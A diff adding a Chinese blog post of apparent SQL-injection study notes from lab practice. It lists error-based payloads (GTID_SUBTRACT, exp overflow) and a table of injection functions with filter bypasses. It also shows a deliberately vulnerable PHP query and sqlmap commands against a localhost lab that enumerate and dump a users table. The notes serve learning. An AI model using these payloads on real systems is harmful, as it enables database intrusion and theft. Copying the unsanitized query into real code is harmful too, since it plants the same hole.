+<h4 id="B-GTID-SUBTRACT"><a href="#B-GTID-SUBTRACT" class="headerlink" title="B. GTID_SUBTRACT()"></a>B. <code>GTID_SUBTRACT()</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND GTID_SUBTRACT(concat(0x7e, (SELECT user()), 0x7e), 1)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-数学-溢出报错"><a href="#5-数学-溢出报错" class="headerlink" title="5. 数学&#x2F;溢出报错"></a>5. 数学&#x2F;溢出报错</h3><p>利用数学指数函数 <code>exp()</code> 产生双精度浮点数溢出错误。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND exp(~(SELECT * FROM (SELECT user()) a))</span><br></pre></td></tr></table></figure>
+
+
+
+<table>
+<thead>
+<tr>
+<th><strong>函数&#x2F;方法</strong></th>
+<th><strong>长度限制</strong></th>
+<th><strong>MySQL 版本</strong></th>
+<th><strong>特点</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>updatexml</strong></td>
+<td>32 字符</td>
+<td>全版本</td>
+<td>最常用，但有长度限制</td>
+</tr>
+<tr>
+<td><strong>extractvalue</strong></td>
+<td>32 字符</td>
+<td>全版本</td>
+<td>updatexml 的完美替代</td>
+</tr>
+<tr>
+<td><strong>floor + group by</strong></td>
+<td><strong>无限制</strong></td>
+<td>全版本</td>
+<td>适合获取长数据，Payload 较繁琐</td>
+</tr>
+<tr>
+<td><strong>ST_LatFromGeoHash</strong></td>
+<td>32 字符</td>
+<td>5.7+</td>
+<td>适合绕过对 “xml” 的过滤</td>
+</tr>
+<tr>
+<td><strong>GTID_SUBSET</strong></td>
+<td>32 字符</td>
+<td>5.7+</td>
+<td>另一种绕过思路</td>
+</tr>
+</tbody></table>
+<p>当然了，报错注入不可能只有这么点，具体情况具体分析。</p>
+<hr>
+<h2 id="二-无回显的sql注入"><a href="#二-无回显的sql注入" class="headerlink" title="二.无回显的sql注入"></a>二.无回显的sql注入</h2><p>这类型的题目主要就是，不管你注入什么，完全就没有回显，是错是对完全不知道。</p>
+<h1 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="#布尔盲注："></a>#布尔盲注：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">简单源码：</span><br><span class="line">&lt;?php</span><br><span class="line">$conn = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;demo_db&quot;);</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE id = &#x27;$id&#x27;&quot;;</span><br><span class="line">$result = mysqli_query($conn, $sql);</span><br><span class="line">if ($result &amp;&amp; mysqli_num_rows($result) &gt; 0) &#123;</span><br><span class="line">    exit(&quot;User Exists!&quot;); </span><br><span class="line">&#125; else</span><br><span class="line">    exit(&quot;User Not Found!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>简单讲就是指我们注入的sql命令执行了，但它并不回显，而是跟数据库的记录进行比较，有就是一个简单的固定的回显，没有就是无回显或者其他的什么之类的，后端并没有讲执行命令的结果直接显示出来，而只是以一个有或者没有的形式回答你，听起来很像海龟汤。</p>
+<p>这个时候，我想到的就是直接sqlmap试一试，就比如sql lab的第八关，当我目前会的sql注入全试一遍，没有结果后，我就直接进行了sqlmap。</p>
+<p><code>sqlmap -u &quot;http://localhost/Less-8/?id=1&quot; --batch</code></p>
+<p>这个之后我也会记录在我的sqlmap学习记录中的。</p>
+<p>使用的指令就是我上面的这个一个，<code>sqlmap -u &quot;url&quot; --batch</code></p>
+<p><img src="/images/QQ20251229-212310.png" alt="alt text"></p>
+<p>简单扫一下，就出结果了，显示的是存在布尔盲注和时间盲注。</p>
+<p>时间盲注就不在这里讲了。</p>
+<p>关键看布尔盲注，布尔盲注的原理就像是爆破，你一个一个推东西给服务器，直到服务器说对，你这个命令是对的，你这个推测是对的。</p>
+<p>所以，正常来说，手敲是很艰难的。</p>
+<p>我先学习用sqlmap这个工具，以后再尝试py脚本。</p>
+<p><code>sqlmap -u &quot;...&quot; --batch --current-db</code></p>
+<p>爆破数据库。</p>
+<p><img src="/images/QQ20251229-213112.png" alt="alt text"></p>
+<p>回显就直接出来了security，这个数据库名。</p>
+<p>再通过数据库名直接爆破表名。</p>
+<p><code>sqlmap -u &quot;...&quot; --batch -D security --tables</code></p>
+<p><img src="/images/QQ20251229-213313.png" alt="alt text"></p>
+<p>这边也是同样直接直接爆了出来。</p>
+<p>有了表名，再爆一爆数据。</p>
+<p><code>sqlmap -u &quot;...&quot; --batch -D security -T users --dump</code></p>
+<p><img src="/images/QQ20251229-213849.png" alt="alt text"></p>
+<p>看这边也是一下子就出来了。</p>
+<p>sqlmap确实很好用。</p>
+<hr>
+<h1 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="#时间盲注："></a>#时间盲注：</h1><p>时间盲注的使用背景就是当应用程序对非法 SQL 语句不返回任何错误信息，且页面内容在无论查询成功或失败时都保持一致（并且布尔盲注失效）时，才会利用数据库的时间延迟函数来判断信息。</p>
+<p>这个注入方式的核心函数为：</p>
+<hr>
+<ul>
+<li>版权声明：本文由白白毛毛创作，转载请注明出处。</li>
+</ul>
+
+        </div>
+    </article>
+</div>
+
+</div>
+
+<script src="/js/main.js?v=1767337365559"></script>
+</body>
+</html>
